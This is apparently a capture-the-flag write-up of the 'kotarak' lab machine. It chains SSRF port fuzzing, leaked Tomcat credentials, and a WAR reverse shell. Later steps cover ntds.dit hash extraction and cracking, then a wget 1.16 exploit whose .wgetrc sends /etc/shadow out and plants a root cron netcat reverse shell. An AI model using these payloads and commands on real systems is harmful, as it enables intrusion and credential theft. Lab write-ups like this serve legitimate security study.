---
layout: post
title: "kotarak"
date: 2025-09-09 
categories: OSCP Playlist
---
# kotarak

# Summary

- rustscan to get all ports
- port 60000 allows navigation to localhost
- ffuf to fuzz open ports
- internal web page in backup revealed tomcat credentials
- upload .war rev shell on tomcat to get foothold
- found ntds.dit and SYTEM file in tomcat homedir
- secretsdump to reveal password for atanas
- atanas history reveal debugfs, read /root/app.log reveal vulnerable wget version
- exploited arbitrary file upload on wget to get rev shell

# Attack Path

First enumerate the open ports and services:

```bash
sudo nmap -sV -sC -oN nmap/kotarak 10.10.10.55

22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:d7:ca:0e:b7:cb:0a:51:f7:2e:75:ea:02:24:17:74 (RSA)
|   256 e8:f1:c0:d3:7d:9b:43:73:ad:37:3b:cb:e1:64:8e:e9 (ECDSA)
|_  256 6d:e9:26:ad:86:02:2d:68:e1:eb:ad:66:a0:60:17:b8 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE OPTIONS
|   Potentially risky methods: PUT DELETE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp open  http    Apache Tomcat 8.5.5
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-title: Apache Tomcat/8.5.5 - Error report
|_http-favicon: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### What is Apache JServ?

- **Apache JServ (AJP/Servlet Engine)** was an official **Java servlet engine** released by the Apache Software Foundation in the late 1990s.
- It allowed the **Apache HTTP Server** to run **Java Servlets** (server-side Java programs) by connecting Apache to a JVM (Java Virtual Machine).
- JServ itself is **deprecated** — it was replaced by **Apache Tomcat**, which is now the standard servlet container.
- The main protocol it introduced, **AJP (Apache JServ Protocol)**, is **still widely used today** (e.g., Apache HTTPD or Nginx connecting to Tomcat over `ajp://`).
- **Legacy systems** still have `mod_jk` or `mod_proxy_ajp` connectors between Apache HTTPD and Tomcat.
- **Security context**: Misconfigured AJP (port `8009`) is vulnerable (e.g., **Ghostcat CVE-2020-1938**) and can allow file read or remote code execution.

Let’s first check out the tomcat application:

```bash
http://10.10.10.55:8080
```

![image.png]({{ site.baseurl }}/assets/kotarak/image.png)

We note down the version of Tomcat 8.5.5.

Let’s attempt to fuzz:

```bash
feroxbuster -u http://10.10.10.55:8080

302      GET        0l        0w        0c http://10.10.10.55:8080/docs => http://10.10.10.55:8080/docs/                                         
302      GET        0l        0w        0c http://10.10.10.55:8080/manager => http://10.10.10.55:8080/manager/                                   
302      GET        0l        0w        0c http://10.10.10.55:8080/docs/images => http://10.10.10.55:8080/docs/images/          
302      GET        0l        0w        0c http://10.10.10.55:8080/docs/config => http://10.10.10.55:8080/docs/config/
302      GET        0l        0w        0c http://10.10.10.55:8080/docs/api => http://10.10.10.55:8080/docs/api/                      
302      GET        0l        0w        0c http://10.10.10.55:8080/examples => http://10.10.10.55:8080/examples/
```

![image.png]({{ site.baseurl }}/assets/kotarak/image%201.png)

Based on this when we visit /manger/html, it prompts us login. Let’s try default login:

```bash
tomcat:tomcat
admin:admin
root:root
tomcat:s3cret
```

Did not work.

Let’s attemt a bruteforce:

```bash
msfconsole
use auxiliary/scanner/http/tomcat_mgr_login
set RPORT 8080
set stop_on_success true
set rhosts 10.10.10.55
run
```

No valid credential found.

We also cannot interact with port 8009 with nc or on the browser. At this point, let’s do another port scan:

```bash
rustscan -a 10.10.10.55 --ulimit 5000

PORT      STATE SERVICE    REASON
22/tcp    open  ssh        syn-ack ttl 63
8009/tcp  open  ajp13      syn-ack ttl 63
8080/tcp  open  http-proxy syn-ack ttl 63
60000/tcp open  unknown    syn-ack ttl 63

```

Let’s scan port 60000 with nmap:

```bash
sudo nmap -sC -sV -p 60000 nmap/kotarak2 10.10.10.55

PORT      STATE SERVICE VERSION
60000/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title:         Kotarak Web Hosting        
|_http-server-header: Apache/2.4.18 (Ubuntu)

```

Let’s visit the site on browser:

![image.png]({{ site.baseurl }}/assets/kotarak/image%202.png)

The hyperlinks on the left hand side don’t work. When we enter in the input field some random text, and click submit, we get:

![image.png]({{ site.baseurl }}/assets/kotarak/image%203.png)

Nothing returns. This might be a potential LFI, but nothing gets returned. 

![image.png]({{ site.baseurl }}/assets/kotarak/image%204.png)

Let’s try to put a URL:

```bash
10.10.10.55:8080
```

![image.png]({{ site.baseurl }}/assets/kotarak/image%205.png)

```bash
10.10.10.55:8080/manager/html
```

![image.png]({{ site.baseurl }}/assets/kotarak/image%206.png)

We get told that JMX interfaces are not protected against CSRF.

Let’s fuzz:

```bash
feroxbuster -u http://10.10.10.55:60000 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 404

200      GET        2l        0w        2c http://10.10.10.55:60000/url.php
200      GET       76l      130w     1169c http://10.10.10.55:60000/

```

Nothing.

Let’s try putting our attack box’s IP:

```bash
10.10.16.7
```

![image.png]({{ site.baseurl }}/assets/kotarak/image%207.png)

Let’s see if it can execute php code, a reverse shell we are hosting:

```bash
<?php
$sock=fsockopen("10.10.16.7",4444);
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>

```

![image.png]({{ site.baseurl }}/assets/kotarak/image%208.png)

Did not work.

Let’s also try if the web can query itself on localhost:

```bash
localhost:8080
```

It works. Let’s try fuzzing for all the ports and see if there are any other web pages hosted internally. 

```bash
seq 1 65535 > numbers.txt

ffuf -w numbers.txt -u http://10.10.10.55:60000/url.php?path=localhost%3aFUZZ -fs 2

110                     [Status: 200, Size: 187, Words: 16, Lines: 18, Duration: 244ms]
22                      [Status: 200, Size: 62, Words: 3, Lines: 5, Duration: 471ms]
200                     [Status: 200, Size: 22, Words: 2, Lines: 4, Duration: 970ms]
320                     [Status: 200, Size: 1232, Words: 93, Lines: 27, Duration: 652ms]
90                      [Status: 200, Size: 156, Words: 10, Lines: 12, Duration: 2308ms]
888                     [Status: 200, Size: 3955, Words: 449, Lines: 79, Duration: 472ms]
3306                    [Status: 200, Size: 123, Words: 5, Lines: 3, Duration: 238ms]
8080                    [Status: 200, Size: 994, Words: 47, Lines: 3, Duration: 24ms]
60000                   [Status: 200, Size: 1171, Words: 226, Lines: 79, Duration: 25ms]
```

Going through each one individually the most interesting one is port 888:

![image.png]({{ site.baseurl }}/assets/kotarak/image%209.png)

We note the http parameter 

```bash
?doc=backup
```

![image.png]({{ site.baseurl }}/assets/kotarak/image%2010.png)

Now let’s try requesting this page on burp:

```bash
GET /url.php?path=localhost%3A888%3Fdoc%3Dbackup HTTP/1.1
```

We get credential:

![image.png]({{ site.baseurl }}/assets/kotarak/image%2011.png)

```bash
admin:3@g01PdhB!
```

Let’s try logging on to tomcat now.

```bash
http://10.10.10.55:8080/manager/html
```

We are in the manager application.

![image.png]({{ site.baseurl }}/assets/kotarak/image%2012.png)

Now we can create a .war reverse shell and execute it:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.7 LPORT=4444 -f war > backup.war
```

Now upload it:

![image.png]({{ site.baseurl }}/assets/kotarak/image%2013.png)

We can upgrade our shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Let’s also see what ports are running:

```bash
ss -lntp

State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
LISTEN     0      128    127.0.0.1:200                      *:*                  
LISTEN     0      80     127.0.0.1:3306                     *:*                  
LISTEN     0      128    127.0.0.1:110                      *:*                  
LISTEN     0      5      10.0.3.1:53                       *:*                  
LISTEN     0      128          *:22                       *:*                  
LISTEN     0      128    127.0.0.1:888                      *:*                  
LISTEN     0      128    127.0.0.1:90                       *:*                  
LISTEN     0      128    127.0.0.1:320                      *:*                  
LISTEN     0      1         ::ffff:127.0.0.1:8005                    :::*                   users:(("java",pid=1227,fd=75))
LISTEN     0      128    fe80::1%lxdbr0:13128                   :::*                  
LISTEN     0      100         :::8009                    :::*                   users:(("java",pid=1227,fd=59))
LISTEN     0      100         :::8080                    :::*                   users:(("java",pid=1227,fd=54))
LISTEN     0      128         :::22                      :::*                  
LISTEN     0      128         :::60000                   :::* 
```

We also check /home dir:

```bash
ls /home

atanas  tomcat

id

uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

We have a home dir. This mean we can have ssh login, let’s achieve persistence

```bash
#Let's create a ssh key on attack host
ssh-keygen -f tomcat
cat tomcat.pub

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGRxx3OoboyvTKrB/FcF3RSocAPsOy2OAnjbBb+yVEQg kali@kali

#Now cat the content and echo it to authorized_keys on target host
mkdir .ssh
cd .ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGRxx3OoboyvTKrB/FcF3RSocAPsOy2OAnjbBb+yVEQg kali@kali" >> authorized_keys

#Now we try to login:
chmod 600 tomcat #change to secure permission to allow use of private key

ssh -i tomcat tomcat@10.10.10.55

```

This does not work. Checking the /etc/ssh/sshd_config shows that public key authentication is disabled.

In the tomcat home dir, we find archive_data/pentest_data:

```bash
20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
```

It says ntds, which includes user credential hashes etc. Let’s exfiltrate these files:

```bash
#on target
python3 -m http.server 8000

#on attack box
wget http://10.10.10.55:8000/20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin

wget http://10.10.10.55:8000/20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
```

Now let’s decrypt it with secretsdump. Let’s assume the .dit file is ntds.dit, and .bin file is SYTEM file, let’s change their name for better readability and:

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

#most important:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::

atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::

[*] Kerberos keys from ntds.dit 
krbtgt:aes256-cts-hmac-sha1-96:14134e1da577c7162acb1e01ea750a9da9b9b717f78d7ca6a5c95febe09b35b8

```

Let’s decrypt this using crackstation:

![image.png]({{ site.baseurl }}/assets/kotarak/image%2014.png)

```bash
Adminsitrator:f16tomcat!
atanas:Password123!
```

Let’s see if we can ssh into atanas:

```bash
ssh atanas@10.10.10.55
```

Did not work. The password did not match. Let’s try tomcat:

```bash
ssh tomcat@10.10.10.55
```

Also did not work.

Checking ifconfig, there are other network cards:

```bash
ifconfig
eth0      Link encap:Ethernet  HWaddr 00:50:56:94:aa:51
          inet addr:10.10.10.55  Bcast:10.10.10.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:fe94:aa51/64 Scope:Link
          inet6 addr: dead:beef::250:56ff:fe94:aa51/64 Scope:Global
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1440565 errors:0 dropped:82 overruns:0 frame:0
          TX packets:1455184 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:213863418 (213.8 MB)  TX bytes:1424551402 (1.4 GB)

lxcbr0    Link encap:Ethernet  HWaddr 00:16:3e:00:00:00
          inet addr:10.0.3.1  Bcast:0.0.0.0  Mask:255.255.255.0
          inet6 addr: fe80::216:3eff:fe00:0/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:183 errors:0 dropped:0 overruns:0 frame:0
          TX packets:182 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:9028 (9.0 KB)  TX bytes:10417 (10.4 KB)

```

Let’s upload a static nmap binary and see what ports are opened on 10.0.3.1

```bash
#on attack host
python3 -m http.server 8001

#on target
wget http://10.10.16.7:8001/static_nmap
chmod +x static_nmap
./static_nmap 10.0.3.1

PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
8080/tcp open  http-alt
```

There is an ssh. Let’s attempt to ssh in:

```bash
ssh atanas@10.0.3.1  #did not work
ssh Administrator@10.0.3.1
```

None of the credentials we got worked. Let query its domain, performing a reverse lookup

```bash
dig @10.0.3.1 -x 10.0.3.1

```

Did not work.

Let’s just try su from our reverse shell:

```bash
su atanas
```

It worked. The correct credential was:

```bash
atanas:f16tomcat!
```

Checking atanas’ history and enumerating basic info:

```bash
cat .bash_history

history
exit
groups
debugfs /dev/sda1

id
uid=1000(atanas) gid=1000(atanas) groups=1000(atanas),4(adm),6(disk),24(cdrom),30(dip),34(backup),46(plugdev),115(lpadmin),116(sambashare)

sudo -l

Sorry, user atanas may not run sudo on kotarak-dmz.
```

## What is `debugfs`?

- A debugging tool for **ext-family filesystems**.
- Lets you inspect and manipulate filesystem internals (inodes, blocks, directories).
- Often used in **forensics** or **CTFs** to read files directly from a disk image or block device.
- ⚠️ Dangerous if run against a live, mounted filesystem in write mode, since you can corrupt it.

Seems like we have to find the right partition, and once we do, we can read the files in /root.

```bash
lsblk -f

NAME         FSTYPE      LABEL UUID                                   MOUNTPOINT
sda                                                                   
├─sda1       ext2              67e178a9-1b2a-407e-8d3f-7b1772bab2be   /boot
├─sda2                                                                
└─sda5       LVM2_member       LnUYcF-uZX0-c91G-XfUl-6BqJ-gk8W-QtnncD 
  ├─Kotarak--vg-root
  │          ext4              efb44a28-8edc-4d40-aca3-81e57d58d759   /
  └─Kotarak--vg-swap_1
             swap              162b2913-7dcf-4ba7-bddc-238a22f16e52   [SWAP]
```

The one we want it ext4, with mount point /.

```bash
debugfs /dev/sda5
```

```bash
debugfs /dev/mapper/Kotarak--vg-root
```

![image.png]({{ site.baseurl }}/assets/kotarak/image%2015.png)

```bash
cat root/.bash_history

rm .bash_history
shutdown
shutdown -c
shutdown now
clear
cd /etc
cd ssh
cat sshd_config
clear
cd /etc/
cd /etc/network/
ls
cat interfaces
ifconfig
ifconfig|head
nano interfaces
reboot
clear
cd /etc/network/
ll
nano interfaces
ifconfig
ifconfig eth0
cat /root/.bash_history
cat /root/app.log
ssh ubuntu@10.0.3.133
clear
ifconfig eth0
shutdown now
cat /etc/passwd
su atanas
gpasswd -d atanas lxd
su tomcat
groups
su atanas
cd /root
ls -la
cat flag.txt
cat app.log
sync
init 0
d
```

Looking in app.log:

```bash
cat root/app.log
10.0.3.133 - - [20/Jul/2017:22:48:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
10.0.3.133 - - [20/Jul/2017:22:50:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
10.0.3.133 - - [20/Jul/2017:22:52:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"

```

```bash
ls root/.ssh

WARNING: terminal is not fully functional
-  (press RETURN)
 407079  (12) .    391808  (12) ..    407082  (4072) known_hosts  
```

```bash
cat root/.mysql_history

_HiStOrY_V2_
exit
show\040databases;
quit;
create\040database\040openmrs;
GRANT\040ALL\040ON\040openmrs.*\040TO\040'openmrs'@'localhost';
FLUSH\040PRIVILEGES;
exit
show\040databases;
exit
```

Let’s try mysql login, as we know there is a mysql db:

```bash
mysql -h localhost -u openmrs -p  #_HiStOrY_V2_

ERROR 1045 (28000): Access denied for user 'openmrs'@'localhost' (using password: YES)
```

In the app.log, we see wget version 1.16 is used. Searching this up on Google revealed this exploit:

https://www.exploit-db.com/exploits/40064

As wget are commonly used in cronjobs by root, the exploit exploits this and will execute commands as root user. 

```bash
In order to exploit this setup, attacker first prepares a malicious .wgetrc 
and starts an FTP server:

attackers-server# mkdir /tmp/ftptest
attackers-server# cd /tmp/ftptest

attackers-server# cat <<_EOF_>.wgetrc
post_file = /etc/shadow
output_document = /etc/cron.d/wget-root-shell
_EOF_

attackers-server# sudo pip install pyftpdlib
attackers-server# python -m pyftpdlib -p21 -w

At this point attacker can start an HTTP server which will exploit wget by
sending malicious redirects to the victim wget's requests
```

Let’s do more of the same changing things slightly, on attack host

```bash
mkdir ftptest
cd ftptest
cat <<_EOF_>.wgetrc
post_file = /etc/shadow
output_document = /etc/cron.d/wget-root-shell
_EOF_

python3 -m pyftpdlib --port 21
```

Let’s also change the exploit.py, the following lines, and copy it to the target machine:

```bash
HTTP_LISTEN_IP = '0.0.0.0'
HTTP_LISTEN_PORT = 80
FTP_HOST = '10.10.16.7'
FTP_PORT = 21

ROOT_CRON = "* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.7 9001 >/tmp/f \n"
```

```bash
cd /dev/shm
wget http://10.10.16.7:8001/exploit.py

```

Now set up listener:

```bash
nc -lnpv 9001
```

We have to use authbind, otherwise we get a permission denied:

```bash
authbind python exploit.py

```

After a while:

2 minutes, we should get a hit on our ftp server, another 2 minutes Sending redirect to [ftp://anonymous@10.10.16.7:21/.wgetrc](ftp://anonymous@10.10.16.7/.wgetrc), then shadow file is read:

```bash
<SNIP>
sshd:*:17366:0:99999:7:::
ubuntu:$6$edpgQgfs$CcJqGkt.zKOsMx1LCTCvqXyHCzvyCy1nsEg9pq1.dCUizK/98r4bNtLueQr4ivipOiNlcpX26EqBTVD2o8w4h0:17368:0:99999:7:::

Sending back a cronjob script as a thank-you for the file...
It should get saved in /etc/cron.d/wget-root-shell on the victim's host (because of .wgetrc we injected in the GET first response)
10.0.3.133 - - [09/Sep/2025 07:18:01] "POST /archive.tar.gz HTTP/1.1" 200 -

File was served. Check on /root/hacked-via-wget on the victim's host in a minute! :) 
```

Finally, cron job is executed and we have root:

![image.png]({{ site.baseurl }}/assets/kotarak/image%2016.png)